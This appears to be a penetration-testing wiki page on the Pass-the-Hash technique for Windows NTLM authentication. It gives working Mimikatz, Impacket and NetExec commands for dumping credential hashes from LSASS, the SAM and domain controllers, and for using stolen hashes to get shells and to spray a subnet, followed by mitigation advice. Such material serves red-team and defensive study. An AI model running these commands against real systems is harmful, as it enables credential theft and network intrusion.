# Pass-the-Hash (PtH)

Pass-the-Hash is a lateral-movement technique where you authenticate using a user's **NTLM hash** instead of their plaintext password. Windows NTLM authentication never needs the actual password - just the hash - so if you dump a hash, you can log in as that user without ever cracking it.

## How it works

When you authenticate over NTLM, the client proves it knows the password by using the NT hash in a challenge-response. Steal the NT hash (from LSASS, the SAM, or an NTDS dump) and you can complete that handshake yourself. No cracking required.

## Getting hashes

- Dump LSASS with Mimikatz (`sekurlsa::logonpasswords`) or `nanodump`
- Dump the local SAM (`lsadump::sam`) for local account hashes
- [DCSync](DCSync.md) for domain account hashes
- Secretsdump from [Impacket](../Tools/Impacket.md):

```bash
impacket-secretsdump domain/user:'Password1'@10.0.0.5
```

## Passing the hash

```bash
# Impacket - run a command / shell as the user
impacket-psexec -hashes :<NThash> administrator@10.0.0.5
impacket-wmiexec -hashes :<NThash> administrator@10.0.0.5

# NetExec - spray a hash across a subnet, find where it is admin
nxc smb 10.0.0.0/24 -u administrator -H <NThash>
nxc smb 10.0.0.0/24 -u administrator -H <NThash> -x "whoami"

# Mimikatz - spawn a process with the hash injected
sekurlsa::pth /user:administrator /domain:corp /ntlm:<NThash>
```

A local admin hash reused across many machines (common with a shared local admin password) lets you sweep an entire network - exactly what [NetExec](../Tools/NetExec.md) is built to find.

## Related techniques

- **Pass-the-Key / OverPass-the-Hash** - use the hash to request a Kerberos TGT
- **Pass-the-Ticket** - reuse a stolen Kerberos ticket directly

## Mitigation

- Deploy **LAPS** so every machine has a unique local admin password.
- Enable Credential Guard to protect LSASS secrets.
- Restrict local admin rights and use tiered administration.
- Block lateral SMB/WMI between workstations; monitor for hash reuse.

## Related

- [DCSync](DCSync.md), [Kerberoasting](Kerberoasting.md)
- [Impacket](../Tools/Impacket.md), [NetExec](../Tools/NetExec.md)
